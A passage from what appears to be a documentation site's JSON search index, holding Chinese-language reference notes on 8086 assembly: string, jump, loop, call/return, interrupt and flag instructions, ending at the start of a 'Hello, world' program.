\u4ece\u5b57\u7b26\u4e32\u53d6\u4e94\u79cd\uff0c\u5b83\u4eec\u90fd\u53ef\u4ee5\u63a5\u4e00\u4e2a\u6307\u4ee4\u524d\u7f00\u3002\u5982\u679c\u4e0d\u63a5\u524d\u7f00\uff0c\u5219\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u5982\u679c\u63a5\u524d\u7f00\uff0c\u5219\u91cd\u590d\u6267\u884c\u3002lods \u6307\u4ee4\u4e0d\u5e38\u7528\u524d\u7f00 \u524d\u7f00 rep \u4f5c\u7528 \uff1a\u628a\u540e\u9762\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u91cd\u590d cx \u6b21 \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e00\u822c\u4e0d\u63a5 cmps scas \u524d\u7f00 repe / repz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a \u524d\u7f00 repne / repnz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u4e0d\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4"},{"location":"cs/pl/asm/#_22","text":"movsb \u6307\u4ee4\u683c\u5f0f \uff1amovsb / rep movsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a movsw \u6307\u4ee4\u683c\u5f0f \uff1amovsw / rep movsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a movs \u6307\u4ee4\u683c\u5f0f \uff1a (rep) movs byte ptr es:[di], byte ptr seg:[si] (rep) movs word ptr es:[di], word ptr seg:[si] \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u8282/\u5b57\u4e3a\u5355\u4f4d\u4ece seg:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\uff0c\u5f53 seg \u4e3a ds \u65f6\u4e0e movsb/movsw \u7b49\u4ef7\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a","title":"\u5b57\u7b26\u4e32\u4f20\u9001\u6307\u4ee4"},{"location":"cs/pl/asm/#_23","text":"cmpsb \u6307\u4ee4\u683c\u5f0f \uff1acmpsb / repe cmpsb / repne cmpsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57\u8282 ds:[si] \u4e0e es:[di]\uff0c\u5373 byte ptr ds:[si] - byte ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF cmpsw \u6307\u4ee4\u683c\u5f0f \uff1acmpsw / repe cmpsw / repne cmpsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57 ds:[si] \u4e0e es:[di]\uff0c\u5373 word ptr ds:[si] - word ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF cmps \u6307\u4ee4\u683c\u5f0f \uff1a (repe/repne) cmps byte ptr seg:[si], byte ptr es:[di] (repe/repne) cmps word ptr seg:[si], word ptr es:[di] \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57\u8282/\u5b57 seg:[si] \u4e0e es:[di]\uff0c\u5373\u5de6\u51cf\u53f3\u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF","title":"\u5b57\u7b26\u4e32\u6bd4\u8f83\u6307\u4ee4"},{"location":"cs/pl/asm/#_24","text":"scasb \u6307\u4ee4\u683c\u5f0f \uff1ascasb / repe scasb / repne scasb \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83 al \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 al - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF scasw \u6307\u4ee4\u683c\u5f0f \uff1ascasw / repe scasw / repne scasw \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83 ax \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 ax - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF","title":"\u5b57\u7b26\u4e32\u626b\u63cf\u6307\u4ee4"},{"location":"cs/pl/asm/#_25","text":"stosb \u6307\u4ee4\u683c\u5f0f \uff1astosb / rep stosb \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a\u5b57\u8282 al \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a stosw \u6307\u4ee4\u683c\u5f0f \uff1astosw / rep stosw \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a\u5b57 ax \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a","title":"\u5b58\u5165\u5b57\u7b26\u4e32\u6307\u4ee4"},{"location":"cs/pl/asm/#_26","text":"lodsb \u6307\u4ee4\u683c\u5f0f \uff1alodsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5b58\u5165 al\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a lodsw \u6307\u4ee4\u683c\u5f0f \uff1alodsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u5b58\u5165 ax\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a lods \u6307\u4ee4\u683c\u5f0f \uff1a lods byte ptr seg:[si] lods word ptr seg:[si] \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece seg:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282/\u5b57\u5b58\u5165 al/ax\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a","title":"\u4ece\u5b57\u7b26\u4e32\u53d6\u6307\u4ee4"},{"location":"cs/pl/asm/#_27","text":"","title":"\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4"},{"location":"cs/pl/asm/#_28","text":"\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 jmp \u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u5373\u77ed\u8df3\u3001\u8fd1\u8df3\u3001\u8fdc\u8df3\uff0c\u5176\u64cd\u4f5c\u7801\u548c\u64cd\u4f5c\u6570\u5747\u4e0d\u540c jmp \u77ed\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest / jmp short dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u53ea\u80fd\u4e3a\u7acb\u5373\u6570\uff0c\u4e14\u76ee\u6807\u5730\u5740 dest \u4e0e\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728\u8303\u56f4 [-128, 127] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e24\u5b57\u8282\uff08EBxx\uff0c\u540e\u4e24\u4f4d\u4e3a\u8ddd\u79bb\uff09 jmp \u8fd1\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728 [-32768, 32767] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e09\u5b57\u8282 jmp \u8fdc\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 cs:ip \u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1acs \u4e5f\u4f1a\u6539\u53d8\uff0cdest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740","title":"\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4"},{"location":"cs/pl/asm/#_29","text":"j cc \u7c7b\u6307\u4ee4 \u6307\u4ee4\u683c\u5f0f \uff1aj cc dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0e\u6807\u5fd7\u4f4d\u6709\u5173\u7684\u6761\u4ef6 cc \u6210\u7acb\uff0c\u5219\u4ee4 ip \u7b49\u4e8e dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1a\u8fd9\u4e9b\u8df3\u8f6c\u90fd\u662f\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 \u6240\u6709\u6b64\u7c7b\u6307\u4ee4\u53ca\u6761\u4ef6 \u6307\u4ee4 \u610f\u4e49 \u6761\u4ef6 \u5907\u6ce8 jz \u7b49\u4e8e\u96f6\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e je jnz \u4e0d\u7b49\u4e8e\u96f6\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jne jc \u6709\u8fdb\u4f4d\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jb jnae jnc \u65e0\u8fdb\u4f4d\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnb jae js \u6709\u7b26\u53f7\u4f4d\u5219\u8df3 sf=1 jns \u65e0\u7b26\u53f7\u4f4d\u5219\u8df3 sf=0 jo \u6709\u6ea2\u51fa\u4f4d\u5219\u8df3 of=1 jno \u65e0\u6ea2\u51fa\u4f4d\u5219\u8df3 of=0 jp/jpe \u6709\u5947\u5076\u4f4d\u5219\u8df3 pf=1 jnp/jpo \u65e0\u5947\u5076\u4f4d\u5219\u8df3 pf=0 ja/jnbe \u65e0\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 cf=0 and zf=0 jae/jnb \u65e0\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnc jb/jae \u65e0\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jc jbe/jna \u65e0\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=1 or zf=1 jg/jnle \u6709\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 sf=of and zf=0 jge/jnl \u6709\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 sf=of jl/jnge \u6709\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 sf!=of jle/jng \u6709\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 sf!=of or zf=1 je \u76f8\u7b49\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e jz jne \u4e0d\u76f8\u7b49\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jnz jcxz \u6307\u4ee4\u683c\u5f0f \uff1ajcxz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c cx \u7b49\u4e8e\u96f6\u5219\u4ee4 ip \u7b49\u4e8e dest \u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1a\u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185","title":"\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4"},{"location":"cs/pl/asm/#_30","text":"loop \u6307\u4ee4\u683c\u5f0f \uff1aloop dest \u6307\u4ee4\u4f5c\u7528 \uff1acx \u8868\u793a\u5faa\u73af\u6b21\u6570\uff0ccx \u5148\u51cf 1\uff0c\u5982\u679c cx \u4e0d\u4e3a 0 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloop \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loopz \u6307\u4ee4\u683c\u5f0f \uff1aloopz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx \u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 1 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloopz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loope \u6307\u4ee4\u683c\u5f0f \uff1aloope dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u76f8\u7b49\u5219\u5faa\u73af \u6ce8\u610f \uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopz loopnz \u6307\u4ee4\u683c\u5f0f \uff1aloopnz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0d\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx \u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 0 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloopnz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loopne \u6307\u4ee4\u683c\u5f0f \uff1aloopne dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u5faa\u73af \u6ce8\u610f \uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopnz","title":"\u5faa\u73af\u6307\u4ee4"},{"location":"cs/pl/asm/#_31","text":"call \u7c7b\u4f3c jmp \u7684\u8fd1\u8df3\u8fdc\u8df3\u4e5f\u6709\u8fd1\u8fc7\u7a0b\u8c03\u7528\u548c\u8fdc\u8fc7\u7a0b\u8c03\u7528\uff0c\u5176\u533a\u522b\u4e5f\u5728\u4e8e cs \u662f\u5426\u53d1\u751f\u53d8\u5316 call \u8fd1\u8c03\u7528 \u6307\u4ee4\u683c\u5f0f \uff1acall dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u5165\u6808\u7136\u540e\u8df3\u8f6c\u5230 dest\uff0c\u5373 push ip, ip = dest \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58 retn \u6307\u4ee4\u683c\u5f0f \uff1aretn / ret / retn count / ret count \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fd1\u8fd4\u56de retn / ret\uff1a\u4ece\u6808\u4e2d\u5f39\u51fa\u4e00\u4e2a\u5341\u516d\u4f4d\u6570\u5230 ip\uff0c\u5373 pop ip retn count / ret count\uff1a\u5148 pop ip \u7136\u540e sp += count \u6ce8\u610f \uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fd1\u8c03\u7528\u8fd4\u56de call \u8fdc\u8c03\u7528 \u6307\u4ee4\u683c\u5f0f \uff1acall dest \u6307\u4ee4\u4f5c\u7528 \uff1apush cs, push ip, cs:ip = dest \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740 retf \u6307\u4ee4\u683c\u5f0f \uff1aretf / retf count \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fdc\u8fd4\u56de\uff0cpop ip, pop cs\uff0c\u82e5\u6709 count \u5219 sp += count \u6ce8\u610f \uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fdc\u8c03\u7528\u8fd4\u56de","title":"\u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de\u6307\u4ee4"},{"location":"cs/pl/asm/#_32","text":"\u4e2d\u65ad\u6307\u4ee4\u4e00\u822c\u7528\u4e8e\u5411\u7cfb\u7edf\u63d0\u51fa\u4e2d\u65ad\u8bf7\u6c42\u5f97\u5230\u7cfb\u7edf\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u770b\u4f5c\u8c03\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u51fd\u6570 int \u6307\u4ee4\u683c\u5f0f \uff1aint n \u6307\u4ee4\u4f5c\u7528 \uff1a\u8c03\u7528 n \u53f7\u4e2d\u65ad\uff0c\u7b49\u6548\u7684\u64cd\u4f5c\u6709 pushf, push cs, push ip tf = 0, if = 0, ip = word ptr 0:[n*4], cs = word ptr 0:[n*4+2] \u6ce8\u610f \uff1an \u4e3a\u7acb\u5373\u6570\uff0c\u79f0\u4e3a\u4e2d\u65ad\u53f7\uff0c\u5728\u8303\u56f4 [0, 0FFh] \u5185\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a OF DF IF TF SF ZF AF PF CF into \u6307\u4ee4\u683c\u5f0f \uff1ainto \u6307\u4ee4\u4f5c\u7528 \uff1a\u6ea2\u51fa\u4e2d\u65ad\uff0c\u5982\u679c of == 1 \u5219\u8c03\u7528 4 \u53f7\u4e2d\u65ad\uff08int 4h\uff09\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a OF DF IF TF SF ZF AF PF CF iret \u6307\u4ee4\u683c\u5f0f \uff1airet \u6307\u4ee4\u4f5c\u7528 \uff1a\u4e2d\u65ad\u8fd4\u56de\uff0c\u7b49\u6548\u64cd\u4f5c\u6709 pop ip, pop cs, popf \u6ce8\u610f \uff1a\u4e00\u822c\u7528\u4e8e\u4ece int \u6216 into \u4ea7\u751f\u7684\u4e2d\u65ad\u4e2d\u8fd4\u56de\uff0c\u6807\u5fd7\u4f4d\u56de\u5230\u4e2d\u65ad\u524d\u7684\u72b6\u6001","title":"\u4e2d\u65ad\u548c\u4e2d\u65ad\u8fd4\u56de\u6307\u4ee4"},{"location":"cs/pl/asm/#_33","text":"clc \u6307\u4ee4\u683c\u5f0f \uff1aclc \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 0 OF DF IF TF SF ZF AF PF CF stc \u6307\u4ee4\u683c\u5f0f \uff1astc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 1 OF DF IF TF SF ZF AF PF CF cmc \u6307\u4ee4\u683c\u5f0f \uff1acmc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fdb\u4f4d\u4f4d\u6c42\u53cd\uff0c\u5373 cf = ~cf OF DF IF TF SF ZF AF PF CF cld \u6307\u4ee4\u683c\u5f0f \uff1acld \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u65b9\u5411\u4f4d\uff0c\u5373 df = 0\uff08\u6b63\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF std \u6307\u4ee4\u683c\u5f0f \uff1astd \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u65b9\u5411\u4f4d\uff0c\u5373 df = 1\uff08\u8d1f\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF cli \u6307\u4ee4\u683c\u5f0f \uff1acli \u6307\u4ee4\u4f5c\u7528 \uff1a\u7981\u6b62\u4e2d\u65ad\uff0c\u5373 if = 0 OF DF IF TF SF ZF AF PF CF sti \u6307\u4ee4\u683c\u5f0f \uff1asti \u6307\u4ee4\u4f5c\u7528 \uff1a\u5141\u8bb8\u4e2d\u65ad\uff0c\u5373 if = 1 OF DF IF TF SF ZF AF PF CF nop \u6307\u4ee4\u683c\u5f0f \uff1anop \u6307\u4ee4\u4f5c\u7528 \uff1a\u65e0\u64cd\u4f5c\uff0c\u673a\u5668\u7801 90h\uff0c\u5360\u7528\u4e00\u4e2a\u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u6d88\u8017\u8fd0\u884c\u65f6\u95f4\uff0c\u4f46\u4e0d\u8fdb\u884c\u64cd\u4f5c hlt \u6307\u4ee4\u683c\u5f0f \uff1ahlt \u6307\u4ee4\u4f5c\u7528 \uff1a\u505c\u6b62\u5904\u7406\u5668\u5de5\u4f5c\uff0c\u76f4\u5230\u7cfb\u7edf\u590d\u4f4d\u6216\u53d1\u9001\u975e\u5c4f\u853d\u4e2d\u65ad\u6216\u5916\u90e8\u4e2d\u65ad","title":"\u6742\u7c7b\u6307\u4ee4"},{"location":"cs/pl/asm/#8086_2","text":"","title":"8086 \u6c47\u7f16\u7a0b\u5e8f\u7f16\u5199"},{"location":"cs/pl/asm/#_34","text":"data segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 hey db ' Hello , world ! ' , 0 Dh , 0 Ah , ' $ ' ; \u4f2a\u6307\u4ee4\u8bed\u53e5 data ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 code segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 assume cs : code , ds : data ; 